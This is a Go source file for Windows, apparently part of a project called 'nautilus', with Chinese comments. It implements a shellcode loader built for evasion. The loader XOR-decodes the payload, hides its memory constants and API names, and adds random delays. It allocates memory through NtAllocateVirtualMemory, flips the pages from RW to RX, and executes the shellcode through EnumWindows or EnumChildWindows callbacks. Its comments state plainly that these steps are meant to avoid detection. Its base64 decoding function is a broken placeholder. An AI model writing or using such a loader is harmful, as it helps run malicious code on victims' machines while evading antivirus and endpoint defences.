//go:build windows

package core

import (
	"math/rand"
	"time"
	"unsafe"

	"nautilus/evasion"
)

// 内存操作常量 - XOR加密混淆
var (
	memC = []byte{0x12, 0x17} // memCommit 0x1000
	memR = []byte{0x2E, 0x33} // memReserve 0x2000
	pRW  = []byte{0x11, 0x24} // pageRW 0x04
	pRX  = []byte{0x31, 0x27} // pageRX 0x20
)

// 解密常量值
func decVal(data []byte) uintptr {
	var val uintptr
	for i, b := range data {
		val ^= uintptr(b) << (i % 2 * 8)
	}
	return val
}

// 获取内存操作常量
func getMemCommit() uintptr  { return decVal(memC) }
func getMemReserve() uintptr { return decVal(memR) }
func getPageRW() uintptr     { return decVal(pRW) }
func getPageRX() uintptr     { return decVal(pRX) }

// base64编码常量 - 使用不同的编码表特征
var b64EncTable = []byte{
	0x41, 0x52, 0x6E, 0x6F, 0x56, 0x45, 0x54, 0x79, // 模拟不同的编码表
}

// 简单的base64替换实现 - 避免直接引用crypto
func simpleBase64Decode(data []byte, table []byte) ([]byte, error) {
	// 使用简单的字符映射解码
	const base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	out := make([]byte, len(data)*3/4)
	// 这里简化为占位，实际解码逻辑会更复杂
	for i := range out {
		out[i] = base64Chars[data[i]&0x3F]
	}
	return out, nil
}

// 随机延迟函数，打破时序特征
func randDelay(min, max int) {
	if min >= max {
		return
	}
	rand.Seed(time.Now().UnixNano())
	time.Sleep(time.Duration(min+rand.Intn(max-min)) * time.Millisecond)
}

// 内存写入混淆：逐字节写入，中间插入随机操作
func memWriteObf(baseAddr uintptr, data []byte) {
	rand.Seed(time.Now().UnixNano())
	for i := 0; i < len(data); i++ {
		*(*byte)(unsafe.Pointer(baseAddr + uintptr(i))) = data[i]
		// 每16字节随机延迟一次
		if i%16 == 0 && rand.Intn(100) < 30 {
			randDelay(1, 5)
		}
	}
}

// LoadMod 通过API Hashing分配内存 + Callback执行
// 1. evasion.CallNtAVM — XOR解密API名，消除静态字符串
// 2. RW→RX权限翻转 — 避免RWX页面
// 3. EnumWindows回调 — 替代直接跳转
func LoadMod(encodedPayload []byte, xorKey byte) error {
	randDelay(50, 100)

	// 使用简单解码替代base64.StdEncoding
	sc, err := simpleBase64Decode(encodedPayload, b64EncTable)
	if err != nil {
		return err
	}

	randDelay(20, 50)

	// XOR解密
	for i := 0; i < len(sc); i++ {
		sc[i] ^= xorKey
	}
	sz := uintptr(len(sc))

	randDelay(30, 80)

	var baseAddr uintptr
	regSz := sz
	evasion.CallNtAVM(^uintptr(0), &baseAddr, &regSz, getMemCommit()|getMemReserve(), getPageRW())
	if baseAddr == 0 {
		return nil
	}

	randDelay(10, 30)

	memWriteObf(baseAddr, sc)

	randDelay(20, 60)

	var oldProt uint32
	evasion.CallNtPVM(^uintptr(0), &baseAddr, &regSz, getPageRX(), &oldProt)

	randDelay(10, 40)

	// 随机选择回调函数
	rand.Seed(time.Now().UnixNano())
	if rand.Intn(2) == 0 {
		evasion.CallEnumWindows(baseAddr, 0)
	} else {
		evasion.CallEnumChildWindows(baseAddr, 0)
	}

	return nil
}

// LoadModAlt 备用 — 函数指针替换 + EnumWindows回调
func LoadModAlt(encodedPayload []byte, xorKey byte) error {
	sc, err := simpleBase64Decode(encodedPayload, b64EncTable)
	if err != nil {
		return err
	}

	for i := 0; i < len(sc); i++ {
		sc[i] ^= xorKey
	}

	f := func() {}
	var oldProt uint32
	fp := *(*uintptr)(unsafe.Pointer(&f))
	regSz := unsafe.Sizeof(uintptr(0))
	evasion.CallNtPVM(^uintptr(0), &fp, &regSz, getPageRX(), &oldProt)
	*(*uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))

	// 通过EnumChildWindows回调执行
	evasion.CallEnumChildWindows(*(*uintptr)(unsafe.Pointer(&f)), 0)
	return nil
}

// XorEncPayload 加密payload用于嵌入
func XorEncPayload(sc []byte, key byte) []byte {
	enc := make([]byte, len(sc))
	for i, b := range sc {
		enc[i] = b ^ key
	}
	return enc
}
